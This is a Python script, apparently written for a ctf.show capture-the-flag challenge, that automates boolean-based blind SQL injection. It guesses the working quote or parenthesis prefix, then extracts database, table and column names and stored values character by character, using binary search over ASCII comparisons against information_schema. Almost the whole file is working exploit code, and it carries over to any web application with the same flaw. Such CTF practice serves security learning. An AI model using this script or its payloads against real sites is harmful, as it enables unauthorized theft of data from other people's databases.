import requests
from lxml import etree



'''
爆破database
'''
def boolean_sql_database(url,strValue,strloc,limit):

    baseurl = url
    asciiValue=0
    eqlualurl=' or ((select (ascii(substr(schema_name,{strloc},1))) from information_schema.schemata limit {limit},1) = {asciiValue}) %23'
    # baseurlequal=baseurl+eqlualurl
    bigurl=' or ((select (ascii(substr(schema_name,{strloc},1))) from information_schema.schemata limit {limit},1) > {asciiValue}) %23'
    # baseurlbig = baseurl+bigurl
    low=0;high=127
    while(low<=high):
        asc=(low+high)//2
        print(asc,end=', ')
        url =baseurl+eqlualurl.format(strloc=strloc, limit=limit, asciiValue=asc)
        pageequal = requests.get(url=url).text
        url =baseurl+bigurl.format(strloc=strloc, limit=limit, asciiValue=asc)
        pagebig = requests.get(url=url).text
        if (strValue in pageequal):
            return chr(asc)
        if(strValue in pagebig):
            low=asc+1
        else:
            high=asc-1

'''
爆破table
'''
def boolean_sql_table(url,strValue,databaseName,strloc,limit):

    baseurl = url
    eqlualurl=" or ((select ascii(substr(table_name,{strloc},1)) from information_schema.tables where table_schema='{databaseName}' limit {limit},1)={asciiValue}) %23"
    # baseurlequal=baseurl+eqlualurl
    bigurl=" or ((select ascii(substr(table_name,{strloc},1)) from information_schema.tables where table_schema='{databaseName}' limit {limit},1)>{asciiValue}) %23"
    # baseurlbig = baseurl+bigurl
    low=0;high=127
    while(low<=high):
        asc=(low+high)//2
        print(asc,end=', ')
        url =baseurl+eqlualurl.format(strloc=strloc, databaseName=databaseName,limit=limit, asciiValue=asc)
        # print(url)
        pageequal = requests.get(url=url).text
        url =baseurl+bigurl.format(strloc=strloc, databaseName=databaseName,limit=limit, asciiValue=asc)
        pagebig = requests.get(url=url).text
        if (strValue in pageequal):
            return chr(asc)
        if(strValue in pagebig):
            low=asc+1
        else:
            high=asc-1

'''
爆破column
'''
def boolean_sql_column(url,strValue,databaseName,tableName,strloc,limit):

    baseurl = url
    eqlualurl=" or ((select ascii(substr(column_name,{strloc},1)) from information_schema.columns where table_schema= '{databaseName}' and table_name= '{tableName}' limit {limit},1) = {asciiValue}) %23"
    # baseurlequal=baseurl+eqlualurl
    bigurl=" or ((select ascii(substr(column_name,{strloc},1)) from information_schema.columns where table_schema= '{databaseName}' and table_name= '{tableName}' limit {limit},1) > {asciiValue}) %23"
    # baseurlbig = baseurl+bigurl
    low=0;high=127
    while(low<=high):
        asc=(low+high)//2
        print(asc,end=', ')
        url =baseurl+eqlualurl.format(strloc=strloc, databaseName=databaseName,tableName=tableName,limit=limit, asciiValue=asc)
        # print(url)
        pageequal = requests.get(url=url).text
        url =baseurl+bigurl.format(strloc=strloc, databaseName=databaseName,tableName=tableName,limit=limit, asciiValue=asc)
        # print(url)
        pagebig = requests.get(url=url).text
        if (strValue in pageequal):
            return chr(asc)
        if(strValue in pagebig):
            low=asc+1
        else:
            high=asc-1


'''
爆破value
'''
def boolean_sql_value(url,strValue,databaseName,tableName,columnName,strloc,limit):

    baseurl = url
    asciiValue=0
    eqlualurl=" or ((select ascii(substr({columnName},{strloc},1)) from {databaseName}.{tableName} limit {limit},1) = {asciiValue}) %23"
    bigurl=" or ((select ascii(substr({columnName},{strloc},1)) from {databaseName}.{tableName} limit {limit},1) > {asciiValue}) %23"
    low=0;high=127
    while(low<=high):
        asc=(low+high)//2
        print(asc,end=', ')
        url =baseurl+eqlualurl.format(strloc=strloc, databaseName=databaseName,tableName=tableName,columnName=columnName,limit=limit, asciiValue=asc)
        pageequal = requests.get(url=url).text
        url =baseurl+bigurl.format(strloc=strloc, databaseName=databaseName,tableName=tableName,columnName=columnName,limit=limit, asciiValue=asc)
        pagebig = requests.get(url=url).text
        if (strValue in pageequal):
            return chr(asc)
        if(strValue in pagebig):
            low=asc+1
        else:
            high=asc-1



if __name__ =="__main__":
    #guessurl
    baseurl="http://adb91802-56a2-4e9d-a2b1-948c86fae388.challenge.ctf.show:8080/?id=-2"
    #爆破url
    url="http://adb91802-56a2-4e9d-a2b1-948c86fae388.challenge.ctf.show:8080/?id=-2"
    #记录的最多数量
    numbermax=6
    #字符的最大长度
    lengthmax=50
    typeList = ['guess','database', 'table', 'column', 'value']
    type = typeList[0]
    #猜测sql语句的格式
    GuessList=["","'",'"',')',"')",'")',"'))",'"))']
    #成功的特征值
    strValue="are"
    #数据库名称
    databaseName="ctfshow"
    #表名称
    tableName="flagjugg"
    #字段名称
    columnName="flag423"

    if(type=="guess"):
        for guess in GuessList:
            url=baseurl+guess+' and (select (ascii(substr(schema_name,1,1))) from information_schema.schemata limit 0,1) >0 %23'
            response=requests.get(url=url).text
            if(strValue in response):
                url=baseurl+guess
                print(f"guess成功:{guess}")
                print(url)
                exit(0)
            else:
                continue


    #自动操作无需修改
    for limit in range(0,numbermax):
        result = []
        for i in range(1,lengthmax):
            if(type=="database"):
                a=boolean_sql_database(url,strValue,i,limit)
            elif(type=="table"):
                a=boolean_sql_table(url,strValue,databaseName,i,limit)
                # a=boolean_sql_column(url,"are","ctftraining","FLAG_TABLE",i,limit)
            elif(type=="column"):
                a=boolean_sql_column(url,strValue,databaseName,tableName,i,limit)
            elif(type=="value"):
                a=boolean_sql_value(url,strValue,databaseName,tableName,columnName,i,limit)
            else:
                print("gkd,重开吧")
            try:
                if(ord(a)!=0 and a!=None):
                    result.append(a)
                else:
                    break
            except:
                break
        print(result)
        r=''.join(result)
        if(r==''):
            print('\n\n查询结束')
            break
        else:
            print(r)
    print(r)

